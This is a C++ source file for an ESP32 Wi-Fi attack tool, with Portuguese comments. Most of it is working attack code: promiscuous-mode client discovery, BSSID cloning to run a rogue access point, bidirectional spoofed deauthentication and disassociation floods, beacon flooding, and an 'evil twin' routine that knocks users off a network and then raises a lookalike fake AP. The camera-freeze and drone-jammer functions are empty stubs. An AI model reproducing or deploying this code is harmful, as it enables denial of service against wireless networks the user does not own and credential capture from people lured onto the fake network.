// ============================================================
// wifi_attacks.cpp - CORRIGIDO v3.1
// ============================================================
#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;

// ============================================================
// BSSID CLONE - ROGUE AP
// ============================================================
static bool bssidCloneActive = false;
static uint8_t originalAPMac[6] = {0};
static uint8_t cloneChannel = 0;
static char cloneSSID[33] = {0};
static unsigned long cloneStartTime = 0;
static uint8_t cloneHealthCheckFailures = 0;

// ============================================================
// CLIENT DISCOVERY (promiscuous mode)
// ============================================================
#define MAX_CLIENTS 16
static uint8_t discoveredClients[MAX_CLIENTS][6];
static uint8_t clientCount = 0;
static bool promiscuousActive = false;

static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *outBssid, const uint8_t **outClient) {
    memset(outBssid, 0, 6);
    *outClient = nullptr;

    if (len < 24) return;

    uint8_t frameType = payload[0] & 0x0C;
    uint8_t toFromDs = payload[1] & 0x03;
    const uint8_t *addr1 = &payload[4];
    const uint8_t *addr2 = &payload[10];
    const uint8_t *addr3 = &payload[16];

    if (frameType == 0x00) {
        memcpy(outBssid, addr3, 6);
        if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
        else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
    }
    else if (frameType == 0x08) {
        switch (toFromDs) {
            case 0x00:
                memcpy(outBssid, addr3, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                else if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
            case 0x01:
                memcpy(outBssid, addr2, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                break;
            case 0x02:
                memcpy(outBssid, addr1, 6);
                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
        }
    }
}

static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    uint8_t frameBssid[6];
    const uint8_t *clientMac = nullptr;

    getBssidFromFrame(payload, len, frameBssid, &clientMac);

    if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
    if (!clientMac) return;
    if (clientMac[0] & 0x01) return;

    for (int i = 0; i < clientCount; i++) {
        if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
    }
    if (clientCount >= MAX_CLIENTS) return;

    memcpy(discoveredClients[clientCount], clientMac, 6);
    clientCount++;
    Serial.printf("[Client] Discovered: %02X:%02X:%02X:%02X:%02X:%02X\n",
        clientMac[0], clientMac[1], clientMac[2],
        clientMac[3], clientMac[4], clientMac[5]);
}

static void startPromiscuous() {
    if (promiscuousActive) return;
    clientCount = 0;
    memset(discoveredClients, 0, sizeof(discoveredClients));

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);

    promiscuousActive = true;
    Serial.println("[Promisc] Started");
}

static void stopPromiscuous() {
    if (!promiscuousActive) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    promiscuousActive = false;
    Serial.println("[Promisc] Stopped");
}

// ============================================================
// RAW FRAME DEAUTH - BIDIRECIONAL
// ============================================================
static uint16_t deauthSeqNum = 0;

// Deauth AP -> Cliente: ENVIA PELA INTERFACE AP (MAC clonado do roteador)
static void sendDeauth_AP_to_Client(const uint8_t* bssid, const uint8_t* clientMac, uint8_t reason) {
    uint8_t frame[26];
    memset(frame, 0, 26);

    frame[0] = 0xC0; // Deauth
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;

    if (clientMac) {
        memcpy(&frame[4], clientMac, 6);   // DA = cliente
    } else {
        memset(&frame[4], 0xFF, 6);        // Broadcast
    }
    memcpy(&frame[10], bssid, 6);          // SA = BSSID (AP clonado)
    memcpy(&frame[16], bssid, 6);          // BSSID

    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;

    frame[24] = reason;
    frame[25] = 0x00;

    // CORRECAO CRITICA: envia pela interface AP, nao STA
    // A interface AP tem o MAC clonado do roteador alvo
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
    if (err == ESP_OK) {
        deauthPacketCount++;
        deauthSuccessCount++;
    }
}

// Deauth Cliente -> AP: ENVIA PELA INTERFACE STA (MAC spoofado do cliente)
static void sendDeauth_Client_to_AP(const uint8_t* bssid, const uint8_t* clientMac, uint8_t reason) {
    if (!clientMac) return;

    uint8_t frame[26];
    memset(frame, 0, 26);

    frame[0] = 0xC0; // Deauth
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;

    memcpy(&frame[4], bssid, 6);           // DA = BSSID (AP)
    memcpy(&frame[10], clientMac, 6);      // SA = cliente (spoofado)
    memcpy(&frame[16], bssid, 6);          // BSSID

    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;

    frame[24] = reason;
    frame[25] = 0x00;

    // Envia pela interface STA com MAC spoofado do cliente
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
    if (err == ESP_OK) {
        deauthPacketCount++;
        deauthSuccessCount++;
    }
}

static void sendDisassoc_AP_to_Client(const uint8_t* bssid, const uint8_t* clientMac, uint8_t reason) {
    uint8_t frame[26];
    memset(frame, 0, 26);

    frame[0] = 0xA0; // Disassoc
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;

    if (clientMac) {
        memcpy(&frame[4], clientMac, 6);
    } else {
        memset(&frame[4], 0xFF, 6);
    }
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);

    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;

    frame[24] = reason;
    frame[25] = 0x00;

    // Envia pela interface AP (MAC clonado do roteador)
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
    if (err == ESP_OK) {
        deauthPacketCount++;
        deauthSuccessCount++;
    }
}

// ============================================================
// BEACON FLOOD
// ============================================================
static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
    uint8_t beacon[128];
    memset(beacon, 0, 128);

    beacon[0] = 0x80;
    beacon[1] = 0x00;
    beacon[2] = 0x00;
    beacon[3] = 0x00;

    memset(&beacon[4], 0xFF, 6);
    memcpy(&beacon[10], bssid, 6);
    memcpy(&beacon[16], bssid, 6);

    beacon[22] = 0x00;
    beacon[23] = 0x00;

    beacon[32] = 0x64;
    beacon[33] = 0x00;

    beacon[34] = 0x01;
    beacon[35] = 0x00;

    beacon[36] = 0x00;
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    beacon[37] = ssidLen;
    memcpy(&beacon[38], ssid, ssidLen);

    uint8_t frameLen = 38 + ssidLen;
    esp_wifi_80211_tx(WIFI_IF_AP, beacon, frameLen, true);
}

// ============================================================
// HELPERS
// ============================================================
static bool isSoftAPActive() {
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    return (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA);
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
    }
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// BSSID CLONE
// ============================================================
static void startBssidClone(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Clone] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];

    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
        target->ssid, target->channel,
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);

    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(1000);

    WiFi.mode(WIFI_AP_STA);
    delay(300);

    // Set AP MAC = target BSSID (isso eh o clone)
    esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
    Serial.printf("[Clone] Set AP MAC: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");
    delay(100);

    bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    Serial.printf("[Clone] softAP: %s\n", apOk ? "OK" : "FAIL");

    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);

        bssidCloneActive = true;
        deauthActive = true;
        cloneStartTime = millis();
        cloneHealthCheckFailures = 0;

        Serial.printf("[Clone] BSSID CLONE ACTIVE on CH%d\n", cloneChannel);
    } else {
        Serial.println("[Clone] FAILED");
    }
}

static void restartBssidClone() {
    if (!bssidCloneActive) return;
    Serial.println("[Clone] Restarting...");

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);

    WiFi.mode(WIFI_AP_STA);
    delay(200);

    esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
    delay(100);

    bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
        cloneHealthCheckFailures = 0;
        Serial.println("[Clone] Restarted OK");
    } else {
        cloneHealthCheckFailures++;
        Serial.printf("[Clone] Restart failed (%d)\n", cloneHealthCheckFailures);
    }
}

static void stopBssidClone() {
    if (!bssidCloneActive) return;
    Serial.println("[Clone] Stopping...");

    stopPromiscuous();

    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);

    WiFi.mode(WIFI_AP_STA);
    delay(200);
    WiFi.disconnect(true);
    delay(200);

    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
    delay(100);

    WiFi.mode(WIFI_STA);
    delay(200);

    bssidCloneActive = false;
    Serial.println("[Clone] Stopped, MACs restored");
}

// ============================================================
// DEAUTH
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthSeqNum = 0;
    clientCount = 0;

    startBssidClone(networkIndex);
    startPromiscuous();

    Serial.println("[Deauth] STARTED");
}

void stopDeauth() {
    if (deauthActive) {
        Serial.println("[Deauth] STOPPED");
        Serial.printf("[Deauth] Runtime: %lu sec, pkts: %lu\n",
            (millis() - cloneStartTime) / 1000, deauthPacketCount);
    }
    deauthActive = false;
    stopBssidClone();

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

// ============================================================
// LOOP DE DEAUTH
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    // CORRECAO CRITICA: trava o canal a cada iteracao
    // O ESP32 pode mudar de canal sozinho em background
    esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);

    static unsigned long lastBurst = 0;
    if (millis() - lastBurst >= 2) { // 2ms entre bursts = ~500 bursts/seg
        lastBurst = millis();

        // Para cada cliente descoberto: deauth bidirecional
        for (int i = 0; i < clientCount; i++) {
            sendDeauth_AP_to_Client(deauthTargetBSSID, discoveredClients[i], 0x07);  // Class 3 frame received from nonassociated STA
            sendDeauth_AP_to_Client(deauthTargetBSSID, discoveredClients[i], 0x01);  // Unspecified reason
            sendDisassoc_AP_to_Client(deauthTargetBSSID, discoveredClients[i], 0x08); // Disassoc because STA leaving
            sendDeauth_Client_to_AP(deauthTargetBSSID, discoveredClients[i], 0x07);
            sendDeauth_Client_to_AP(deauthTargetBSSID, discoveredClients[i], 0x01);
        }

        // Broadcast fallback (para pegar clientes nao descobertos ainda)
        sendDeauth_AP_to_Client(deauthTargetBSSID, nullptr, 0x07);
        sendDeauth_AP_to_Client(deauthTargetBSSID, nullptr, 0x01);

        // Beacon flood para manter o clone visivel
        sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID);
    }

    // HEALTH CHECK a cada 3 segundos
    static unsigned long lastHealthCheck = 0;
    if (millis() - lastHealthCheck > 3000) {
        lastHealthCheck = millis();

        // Re-forca o canal no health check tambem
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);

        if (!isSoftAPActive()) {
            cloneHealthCheckFailures++;
            if (cloneHealthCheckFailures < 5) {
                restartBssidClone();
                startPromiscuous();
            } else {
                stopDeauth();
                return false;
            }
        } else {
            int clients = WiFi.softAPgetStationNum();
            Serial.printf("[Clone] %d on clone | %d target clients | CH%d\n", 
                clients, clientCount, cloneChannel);
        }
    }

    static unsigned long lastDebug = 0;
    if (millis() - lastDebug > 5000) {
        lastDebug = millis();
        Serial.printf("[Deauth] runtime=%lus pkts=%lu clients=%d/%d CH%d\n",
            (millis() - cloneStartTime) / 1000,
            deauthPacketCount,
            WiFi.softAPgetStationNum(),
            clientCount,
            cloneChannel);
    }

    return true;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678", 1, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    startDeauth(networkIndex);
    delay(3000);
    stopDeauth();
    startFakeAP(scannedNetworks[networkIndex].ssid);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
